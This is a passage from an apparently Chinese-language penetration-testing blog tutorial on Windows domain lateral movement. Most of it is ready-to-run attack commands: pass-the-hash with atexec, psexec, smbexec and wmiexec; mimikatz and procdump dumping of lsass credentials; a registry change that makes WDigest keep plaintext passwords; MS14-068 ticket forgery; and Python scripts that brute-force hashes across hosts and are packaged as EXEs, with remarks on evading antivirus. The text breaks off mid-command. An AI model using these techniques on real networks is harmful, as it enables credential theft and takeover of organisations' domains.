<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  schtasks <span class="regexp">/delete /</span>s <span class="number">192.168</span>.<span class="number">3.21</span> <span class="regexp">/tn adduser /</span>f</span><br></pre></td></tr></table></figure>
<h5 id="网络协议工具包-impacket"><a href="#网络协议工具包-impacket" class="headerlink" title="网络协议工具包|impacket"></a>网络协议工具包|impacket</h5><p>获取到的密码为hash显示的话。at和schtasks都不支持hash值的密码，要解决需要用impacket工具包</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    atexec<span class="selector-class">.exe</span> ./<span class="selector-attr">[用户名]</span>:<span class="selector-attr">[密码]</span>@<span class="selector-attr">[IP]</span> <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> <span class="selector-attr">[域名]</span>/<span class="selector-attr">[用户名]</span>:<span class="selector-attr">[密码]</span>@<span class="selector-attr">[IP]</span> <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> -hashes <span class="selector-attr">[密码的hash值]</span> ./<span class="selector-attr">[用户名]</span>@<span class="selector-attr">[IP]</span> <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> ./administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span> </span><br></pre></td></tr></table></figure>
<p>缺点是要导入到对方主机，要提前免杀。</p>
<h5 id="基于上述传递渗透的综合进阶思路"><a href="#基于上述传递渗透的综合进阶思路" class="headerlink" title="基于上述传递渗透的综合进阶思路"></a>基于上述传递渗透的综合进阶思路</h5><p><code>重点1：横向渗透|明文HASH传递批量利用</code><br>实战中，我们获取到了一台主机的权限，我们可以使用mimikatz跑出当前主机administor的密码，然后将这个密码作为字典，去爆破所有存存活主机。<br>前提：导入impacket<br><code>1、一个密码对多个存活ip（ip作为字典）</code></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   FOR /F %%i <span class="keyword">in</span> ([每行一个IP.txt]) <span class="keyword">do</span> atexec.exe ./[用户名]:[密码]@%%i <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">   FOR /F %%i <span class="keyword">in</span> (ips.txt) <span class="keyword">do</span> atexec.exe ./administrator:admin!@#45@%%i whoami</span><br><span class="line">ips.txt是存活主机的ip；admin!@#45@%%i是当前跑出的密码；若匹配则回显whami执行结果</span><br></pre></td></tr></table></figure>
<p><code>2、多个密码单点爆破IP（密码作为字典）</code></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   FOR /F %%i <span class="keyword">in</span> ([每行一个密码.txt]) <span class="keyword">do</span> atexec.exe ./[用户名]:%%i@[IP] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">   FOR /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./administrator:%%i@192<span class="number">.168</span><span class="number">.3</span><span class="number">.21</span> whoami</span><br></pre></td></tr></table></figure>
<p><code>3、如果不是明文，是hash</code></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    FOR /F %%i <span class="keyword">in</span> ([每行一个密码的hash值.txt]) <span class="keyword">do</span> atexec.exe -hashes %%i ./[用户名]@[IP] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    FOR /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe -hashes %%i ./administrator@192<span class="number">.168</span><span class="number">.3</span><span class="number">.21</span> whoami </span><br></pre></td></tr></table></figure>
<p><code>4、用户作为字典</code><br><code>重点2：上述方法是只存在一个变量，我怎么保证每个都可以是变量</code>（省时省力）<br>不需要引入impacket，通过是否成功建立ipc连接判断对应账号密码。<br>py脚本实现，然后把py脚本打包成exe文件，放在对方主机运行。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ips&#123;</span><br><span class="line">    <span class="string">&#x27;ip1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ip2</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">users&#123;</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="keyword">user</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">passs&#123;</span></span><br><span class="line"><span class="string">    &#x27;</span>pass<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">for ip in ips:</span></span><br><span class="line"><span class="string">  for user in users:</span></span><br><span class="line"><span class="string">    for mima in passs:</span></span><br><span class="line"><span class="string">       exec=&quot;net use \\&quot;+&quot;\\&quot;+ip+&#x27;</span>ipc$<span class="string">&#x27;+mima+&#x27;</span> /<span class="keyword">user</span>:<span class="keyword">domain</span>\\<span class="string">&#x27;+user</span></span><br><span class="line"><span class="string">       print(&#x27;</span><span class="comment">---&gt;&#x27;+exec+&#x27;&lt;---&#x27;)</span></span><br><span class="line">       #os.<span class="keyword">system</span>(exec)</span><br><span class="line">       <span class="type">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#domain：域;ips:存活ip；users:（域）用户；passs:收集的密码</span></span><br><span class="line">#（当前用户为非域内用户）执行后net <span class="keyword">user</span>看看，有收获</span><br><span class="line">#随后，就是at|schtasks协议的复现，看上面即可。</span><br></pre></td></tr></table></figure>
<p>随后：<br>安装pyinstaller</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    pip <span class="keyword">install</span> pyinstaller</span><br></pre></td></tr></table></figure>
<p>生成可执行EXE</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attribute">pyinstaller</span> -F<span class="meta"> [.py文件]</span></span><br></pre></td></tr></table></figure>
<p>会生成一个同名的exe文件</p>
<h4 id="传递-smb-wmi"><a href="#传递-smb-wmi" class="headerlink" title="传递|smb|wmi"></a>传递|smb|wmi</h4><p><code>前置知识</code><br>1、WDigest 是一个较旧的协议，已被认为不够安全，因为它存储用户密码的明文副本，这使得它容易受到攻击和密码泄露的风险。<br>2、Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码<br>   Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码<br>3、针对以上情况，我们提供了4种方式解决此类问题<br>（1）、利用哈希hash传递（pth、ptk等）进行哈希移动（哈希）<br>（2）、利用其它服务协议（SMB、WMI等）进行哈希移动（哈希）<br>（3）、利用注册表操作开启Wdigest Auth值进行获取（明文）</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span></span><br></pre></td></tr></table></figure>
<p>（4）、利用工具或第三方平台（Hachcat）进行破解获取（明文）<br><code>感觉就是枚举、爆破、碰撞获取明文</code><br>hashcat：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/567771788">https://zhuanlan.zhihu.com/p/567771788</a></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -<span class="keyword">a</span> <span class="number">0</span> -m <span class="number">1000</span> hash <span class="built_in">file</span> <span class="comment">--force</span></span><br></pre></td></tr></table></figure>
<p><code>Procdump(微软官方-支持全系统)+Mimikatz配合获取密码</code><br>当mimikatz获取失败时配合procdump获取密码</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">生成储存着密码hash值的.dmp文件(可以在自己的电脑运行后拖到目标主机)</span><br><span class="line">    procdump <span class="params">-accepteula</span> <span class="params">-ma</span> lsass.exe lsass.dmp</span><br><span class="line">将dmp文件放到mimikatz上执行（可以获取自己电脑的密码）</span><br><span class="line">    sekurlsa<span class="type">::minidump</span> lsass.dmp</span><br><span class="line">    sekurlsa<span class="type">::logonPasswords</span> <span class="literal">full</span></span><br></pre></td></tr></table></figure>
<p><code>新思路：在实战情况下，mimikatz可能会被干掉，那么只需要在目标主机运行procdump生成.dmp文件，然后拖到自己的电脑配合mimikatz爆目标的密码</code><br>附两款提取密码的软件<br>Pwdump7<br>QuarksPwdump<br>4、Windows系统LM Hash及（NTLM Hash–优先考虑）加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>
<h5 id="传递-SMB"><a href="#传递-SMB" class="headerlink" title="传递|SMB"></a>传递|SMB</h5><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。<br><code>1、pstools--建立在获取到明文密码</code><br><code>psexec.exe第一种：</code>先有ipc链接，psexec需要明文或hash传递<br>需要先有ipc链接，-s以System权限运行</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">建立ipc连接 </span><br><span class="line">   <span class="keyword">net</span> <span class="keyword">use</span> \\[IP]\ipc$<span class="string">&quot;[密码]&quot;</span> /user:[用户名]</span><br><span class="line">   <span class="keyword">net</span> <span class="keyword">use</span> \\192.168.3.32\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line">横向渗透</span><br><span class="line">    psexec \\[IP] -s cmd</span><br><span class="line">    psexec \\192.168.3.32 -s cmd</span><br></pre></td></tr></table></figure>
<p><code>psexec.exe第二种：</code>不用建立IPC直接提供明文账户密码</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec \\<span class="selector-attr">[IP]</span> -u <span class="selector-attr">[用户名]</span> -<span class="selector-tag">p</span> <span class="selector-attr">[密码]</span> -s cmd</span><br><span class="line">psexec \\<span class="number">192.168</span>.<span class="number">3.21</span> -u administrator -<span class="selector-tag">p</span> Admin12345 -s cmd </span><br></pre></td></tr></table></figure>
<p><code>若使用psexec.exe时，获取不到明文仅获取到hash时</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes :<span class="selector-attr">[密码的hash值]</span> <span class="selector-attr">[域名]</span>/<span class="selector-attr">[用户名]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">psexec -hashes :<span class="variable">$HASH</span>$ domain/administrator@<span class="number">10.1</span>.<span class="number">2.3</span></span><br></pre></td></tr></table></figure>
<p><code>官方Pstools无法采用hash连接，还是可以使用impacket工具包，操作简单，容易被杀 </code><br><code>2、smbexec无需先ipc链接</code><br>明文或hash传递都可以，但是这个是集成在impacket内的（也要考虑免杀）。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">连接域内用户</span><br><span class="line">    smbexec <span class="selector-attr">[域名]</span>/<span class="selector-attr">[用户名]</span>:<span class="selector-attr">[密码]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">    smbexec god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span></span><br><span class="line">连接本地用户</span><br><span class="line">    smbexec ./<span class="selector-attr">[用户名]</span>:<span class="selector-attr">[密码]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">    smbexec ./administrator:admin!@#<span class="number">45</span>@<span class="number">192.168</span>.<span class="number">3.32</span></span><br><span class="line">当仅仅获取到hash</span><br><span class="line">    smbexec -hashes :<span class="selector-attr">[密码的hash值]</span> ./<span class="selector-attr">[用户名]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">    smbexec -hashes :<span class="variable">$HASH</span>$ ./admin@<span class="number">192.168</span>.<span class="number">3.21</span></span><br><span class="line">    smbexec -hashes :<span class="selector-attr">[密码的hash值]</span> <span class="selector-attr">[域名]</span>/<span class="selector-attr">[用户名]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">    smbexec -hashes :<span class="variable">$HASH</span>$ domain/admin@<span class="number">192.168</span>.<span class="number">3.21</span> </span><br></pre></td></tr></table></figure>
<h5 id="传递-WMI"><a href="#传递-WMI" class="headerlink" title="传递|WMI"></a>传递|WMI</h5><p>域横向移动WMI服务利用-cscript、wmiexec、wmic<br>WMI(Windows Management Instrumentation)是通过<code>135</code>端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。（这个协议好像仅仅支持连接administor，连接其他用户使用其他协议）<br><code>1、win自带WMIC明文传递，无回显（感觉较为鸡肋）</code><br> <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    wmic /node:[IP] /<span class="keyword">user</span>:[用户名] /<span class="keyword">password</span>:[密码] process <span class="keyword">call</span> <span class="keyword">create</span> &quot;[命令]&quot;</span><br><span class="line">    wmic /node:<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> /<span class="keyword">user</span>:administrator /<span class="keyword">password</span>:Admin12345 process <span class="keyword">call</span> <span class="keyword">create</span> &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br><span class="line">（运行cmd，执行ipconfig并将结果输出到C盘下的<span class="number">1.</span>txt中）</span><br></pre></td></tr></table></figure><br><code>2、win自带cscript明文传递，有回显，需要下载wmiexec.vbs配合</code></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">cscript</span> <span class="comment">//nologo wmiexec.vbs /shell [IP] [用户名] [密码]</span></span><br><span class="line">    <span class="keyword">cscript</span> <span class="comment">//nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span></span><br><span class="line">会反弹一个<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<p>下载网址：<a target="_blank" rel="noopener" href="https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs">https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs</a><br><code>3、套件impacket wmiexec明文或hash传递，有回显exe版本，可能被杀</code></p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    wmiexec ./[用户名]:[密码]@[<span class="symbol">IP</span>] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    wmiexec ./administrator:admin!@#<span class="number">45</span>@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    wmiexec [域名]/[用户名]:[密码]@[<span class="symbol">IP</span>] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    wmiexec god/administrator:<span class="symbol">Admin12345</span>@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    wmiexec -hashes :[密码的hash值] ./[用户名]:[密码]@[<span class="symbol">IP</span>] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    wmiexec -hashes :<span class="number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    wmiexec -hashes :[密码的hash值] [域名]/[用户名]:[密码]@[<span class="symbol">IP</span>] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="基于上述传递渗透的综合利用思路"><a href="#基于上述传递渗透的综合利用思路" class="headerlink" title="基于上述传递渗透的综合利用思路"></a>基于上述传递渗透的综合利用思路</h5><p><code>域横向移动以上服务hash批量利用-python编译exe</code><br>利用py脚本制作的exe文件批量尝试横向渗透，方便省事，对于仅仅获取到hash的要提一嘴：<code>不同字符串的hash可能一样，所以我们可以利用这个特点，去进行hash碰撞</code>。<br>这里提供一个脚本（py可以进行免杀）</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import os,time</span><br><span class="line"> </span><br><span class="line">ips=&#123;</span><br><span class="line"><span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">users=&#123;</span><br><span class="line"><span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">hashs=&#123;</span><br><span class="line"><span class="comment">#&#x27;ccef208c6485269c20db2cad21734fe7&#x27;,</span></span><br><span class="line"><span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for ip in ips:</span><br><span class="line">    for <span class="literal">user</span> in users:</span><br><span class="line">        for mimahash in hashs:</span><br><span class="line">            <span class="comment">#域用户和本地用户都试试</span></span><br><span class="line">            <span class="comment">#wmiexec -hashes :hash god/user@ip whoami</span></span><br><span class="line">            <span class="comment">#wmiexec -hashes :hash ./user@ip whoami</span></span><br><span class="line">            <span class="keyword">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+<span class="literal">user</span>+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            exec1 = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; ./&quot;</span>+<span class="literal">user</span>+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="literal">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="keyword">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            <span class="literal">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.<span class="params">system</span>(<span class="keyword">exec</span>)</span><br><span class="line">            os.<span class="params">system</span>(exec1)</span><br><span class="line">            time.<span class="keyword">sleep</span>(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
<p>编译成exe文件</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pyinstaller</span> -F fuck_neiwang_002.py</span><br></pre></td></tr></table></figure>
<h4 id="传递-阶段总结"><a href="#传递-阶段总结" class="headerlink" title="传递|阶段总结"></a>传递|阶段总结</h4><p><code>引出下一个重要内容</code><br><img src="https://pic.imgdb.cn/item/65748049c458853aef0b99c0.jpg"><br>假设对于impacket等免杀不过去，那就要提到PTH、PTT、PTK了。</p>
<h4 id="传递-PTH-PTK-PTT"><a href="#传递-PTH-PTK-PTT" class="headerlink" title="传递|PTH|PTK|PTT"></a>传递|PTH|PTK|PTT</h4><p><code>重要</code><br>PTH(pass the hash)         #利用lm或ntlm的值进行的渗透测试<br>PTT(pass the ticket)        #利用的票据凭证TGT进行的渗透测试<br>PTK(pass the key)           #利用的ekeys aes256进行的渗透测试<br><code>1、PTH和PTK</code><br>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。<br><code>2、PTT</code><br>PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。<br>基于MS14-068漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术（后面详细说）<br><code>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。</code>微软给出的补丁是kb3011780<br><code>Kerberos协议具体工作方法，在域中：</code><br>客户机将明文密码进行NTLM哈希,然后和时间戳一起加密（使用krbtgt密码hash作为密钥），发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)。<br>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据。<br>然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测。<br>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。 <code>（TGT类似于cookie，应该这样理解）</code><br><code>所以，PTT和另外两个不同，因为PTT所使用的协议和另外两个不同</code></p>
<h5 id="传递-PTH"><a href="#传递-PTH" class="headerlink" title="传递|PTH"></a>传递|PTH</h5><p>域横向移动PTH传递-mimikatz</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取权限</span></span><br><span class="line">    privilege::debug</span><br><span class="line">PTH ntlm传递</span><br><span class="line"><span class="comment">#在未打补丁的工作组及域连接：</span></span><br><span class="line">    sekurlsa::pth /user:[用户名] /domain:[域名或“workgroup”] /ntlm:[ntlm的值]</span><br><span class="line">    sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"><span class="comment">#“domain”的值为“workgroup”时，连接的是本地用户</span></span><br><span class="line"><span class="comment">#成功会自动创建一个cmd，可以通过该cmd操作对应用户名的机器，如</span></span><br><span class="line"><span class="comment">#查看C盘目录</span></span><br><span class="line">    <span class="built_in">dir</span> \\192.168.3.21\c$</span><br><span class="line"><span class="comment">#IP地址不识别可以换成计算机名</span></span><br></pre></td></tr></table></figure>
<p><code>1、注意：攻击时我们不知道IP、计算机名与用户名对应的情况，所以这是随机攻击，需要再测试看是哪个IP、计算机名对应的电脑被攻击了（还是要看前期信息收、集，直接写脚本跑，看哪个存在回显就是连接到哪台主机的哪个用户）</code><br><code>2、有话说</code>：如果禁用了ntlm认证，PsExec（利用SMB服务传递hash|明文那个）无法利用获得的ntlm hash进行远程连接，<code>但是使用mimikatz(PTH)还是可以攻击成功。</code>对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用AES keys代替NT hash来实现PTK攻击。<br>ps：KB2871997补丁后的影响<br>pth：没打补丁用户都可以连接，打了补丁只能administrator连接<br>ptk：必须打了上面那个补丁用户才可以连接（也就是说PTH受补丁限，可以考虑使用PTK），采用aes256连接<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a><br>顺便提一嘴：补丁信息通过“systeminfo”查看。<br><img src="https://pic.imgdb.cn/item/6575bd1dc458853aefd5eebc.webp" title="补丁对于PTH、PTK的影响"></p>
<h5 id="传递-PTK"><a href="#传递-PTK" class="headerlink" title="传递|PTK"></a>传递|PTK</h5><p>域横向移动PTK传递-mimikatz<br>PTK aes256传递<br>打补丁后的工作组及域连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取权限</span><br><span class="line">    privilege::debug</span><br><span class="line">获取aes值</span><br><span class="line">    sekurlsa::ekeys</span><br><span class="line">连接</span><br><span class="line">    sekurlsa::pth /user:[用户名] /domain:[域名或“workgroup”] /aes256:[aes256的值]</span><br><span class="line">    sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e </span><br></pre></td></tr></table></figure>
<h5 id="传递-PTT"><a href="#传递-PTT" class="headerlink" title="传递|PTT"></a>传递|PTT</h5><p><code>域横向移动PTT传递-ms14068&amp;kekeo&amp;本地</code><br><code>1、利用漏洞ms14-068（类似于cookie伪造）</code><br>作用：能实现域内普通用户直接获取域控system权限<br>操作：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MS14-<span class="number">068</span> powershell执行</span><br><span class="line"><span class="number">1</span>.查看当前sid</span><br><span class="line">    whoami /user</span><br><span class="line"><span class="number">2</span>.启动mimikatz，不需要提升权限，能用就行</span><br><span class="line">（清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造）</span><br><span class="line">    kerberos::purge</span><br><span class="line">查看当前机器凭证</span><br><span class="line">    kerberos::list</span><br><span class="line">将票据注入到内存中</span><br><span class="line">    kerberos::ptc <span class="selector-attr">[票据文件]</span></span><br><span class="line"><span class="number">3</span>.利用ms14-<span class="number">068</span>生成TGT数据</span><br><span class="line">    ms14-<span class="number">068</span><span class="selector-class">.exe</span> -u <span class="selector-attr">[域成员名]</span>@<span class="selector-attr">[域名]</span> -s <span class="selector-attr">[sid]</span> -d <span class="selector-attr">[域控IP地址]</span> -<span class="selector-tag">p</span> <span class="selector-attr">[域成员密码]</span></span><br><span class="line">    MS14-<span class="number">068</span><span class="selector-class">.exe</span> -u mary@god<span class="selector-class">.org</span> -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1218902331</span>-<span class="number">2157346161</span>-<span class="number">1782232778</span>-<span class="number">1124</span> -d <span class="number">192.168</span>.<span class="number">3.21</span> - <span class="selector-tag">p</span> admin!@#<span class="number">45</span></span><br><span class="line"><span class="number">4</span>.票据注入内存</span><br><span class="line">    kerberos::ptc TGT_mary@god<span class="selector-class">.org</span><span class="selector-class">.ccache</span></span><br><span class="line"><span class="number">5</span>. 查看凭证列表</span><br><span class="line">    klist</span><br><span class="line"><span class="number">6</span>.利用</span><br><span class="line">    dir \\<span class="number">192.168</span>.<span 